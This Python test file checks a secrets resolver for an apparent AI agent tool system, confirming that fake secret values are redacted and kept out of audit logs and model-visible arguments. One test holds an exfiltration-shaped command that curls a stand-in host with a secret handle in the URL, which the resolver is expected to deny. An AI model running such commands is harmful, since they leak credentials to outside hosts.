"""Tests for the secrets resolver (``codx.junior.security.ciso.vault``).

The property under test is narrow and absolute: a resolved value must never
appear in the model-visible tool arguments, in a redacted result, in an audit
row, in ``repr()``/``str()`` or in the tool cache key. The fixtures are
obviously fake on purpose -- a test file must never need a real secret.
"""

import base64
import json
import urllib.parse

import pytest

from codx.junior.security.ciso import vault as secret_vault
from codx.junior.security.ciso.models import CisoPolicy, SecretPolicy

FAKE = "unit-test-value-1234"  # deliberately not secret-shaped
VAR = "UNIT_TEST_TOKEN"


def _policy(**overrides) -> CisoPolicy:
    """Return a policy whose secrets block is *overrides*."""
    return CisoPolicy(secrets=SecretPolicy(**overrides))


def test_handles_are_parsed():
    handles = list(secret_vault.iter_handles(
        {"env": {"A": "{{env:A}}"}, "command": "echo {{secret:B}}"}
    ))
    assert [(handle.name, handle.source) for _, _, handle in handles] == [("A", "env"), ("B", "secret")]


def test_env_handle_lands_in_env_only(monkeypatch):
    monkeypatch.setenv(VAR, FAKE)
    params = {"command": "aws s3 ls", "env": {"AWS_SECRET_ACCESS_KEY": f"{{{{env:{VAR}}}}}"}}
    result = secret_vault.resolve_for_tool(params, "execute_command", step_id="s1", policy=_policy())
    assert result.error is None
    assert result.params["env"]["AWS_SECRET_ACCESS_KEY"] == FAKE
    assert result.params["command"] == "aws s3 ls"
    assert list(result.redactions) == [VAR]


def test_handle_inside_command_is_denied(monkeypatch):
    monkeypatch.setenv(VAR, FAKE)
    params = {"command": f"curl https://example.test/{{{{env:{VAR}}}}}"}
    result = secret_vault.resolve_for_tool(params, "execute_command", policy=_policy())
    assert result.error is not None
    assert "denied_sink" in result.error
    assert FAKE not in result.error
    assert result.params["command"] == params["command"]


def test_handle_mixed_with_text_is_denied(monkeypatch):
    monkeypatch.setenv(VAR, FAKE)
    params = {"env": {"A": f"prefix-{{{{env:{VAR}}}}}"}}
    result = secret_vault.resolve_for_tool(params, "execute_command", policy=_policy())
    assert "denied_sink" in (result.error or "")


def test_denied_tool_never_receives_a_secret(monkeypatch):
    monkeypatch.setenv(VAR, FAKE)
    params = {"text": f"{{{{env:{VAR}}}}}"}
    result = secret_vault.resolve_for_tool(params, "fetch_webpage", policy=_policy())
    assert "denied_sink" in (result.error or "")
    params = {"env": {"A": f"{{{{env:{VAR}}}}}"}}
    result = secret_vault.resolve_for_tool(params, "fetch_webpage", policy=_policy())
    assert "denied_tool" in (result.error or "")


def test_vault_source_requires_a_grant(tmp_path):
    vault = secret_vault.SecretVault(str(tmp_path), _policy())
    resolved = vault.resolve("ANY_SECRET", tool="execute_command", step_id="s", sink="env",
                             source="secret")
    assert isinstance(resolved, secret_vault.SecretError)
    assert resolved.code in {"denied_tool", "vault_unavailable"}


def test_resolved_value_never_renders(monkeypatch):
    monkeypatch.setenv(VAR, FAKE)
    vault = secret_vault.SecretVault("/tmp", _policy())
    resolved = vault.resolve(VAR, tool="execute_command", step_id="s", sink="env", source="env")
    assert resolved.value == FAKE
    assert FAKE not in repr(resolved)
    with pytest.raises(TypeError):
        str(resolved)


def test_redaction_covers_base64_and_urlencoding():
    redactions = secret_vault.RedactionSet([("T", FAKE)])
    encoded = base64.b64encode(FAKE.encode()).decode()
    quoted = urllib.parse.quote(FAKE, safe="")
    masked = redactions.mask(" ".join([FAKE, encoded, quoted]))
    assert FAKE not in masked
    assert masked.count("***[secret:T]***") == 3


def test_redact_result_scrubs_a_tool_response():
    class Response:
        user_response = f"token={FAKE}"
        llm_response = f"used {FAKE}"
        logs = [f"export T={FAKE}"]

    redacted = secret_vault.redact_result(Response(), secret_vault.RedactionSet([("T", FAKE)]))
    assert FAKE not in redacted.user_response + redacted.llm_response + "".join(redacted.logs)


def test_audit_row_holds_the_name_not_the_value(monkeypatch, tmp_path):
    monkeypatch.setenv(VAR, FAKE)
    vault = secret_vault.SecretVault(str(tmp_path), _policy())
    vault.resolve(VAR, tool="execute_command", step_id="s1", sink="env", source="env")
    payload = open(vault.audit_path, "r", encoding="utf-8").read()
    row = json.loads(payload.strip().splitlines()[-1])
    assert row["secret"] == VAR
    assert row["event"] == "resolve"
    assert FAKE not in payload


def test_list_never_enumerates_the_environment(monkeypatch, tmp_path):
    monkeypatch.setenv("SOME_UNDECLARED_VARIABLE", FAKE)
    vault = secret_vault.SecretVault(str(tmp_path), _policy())
    assert vault.list() == []
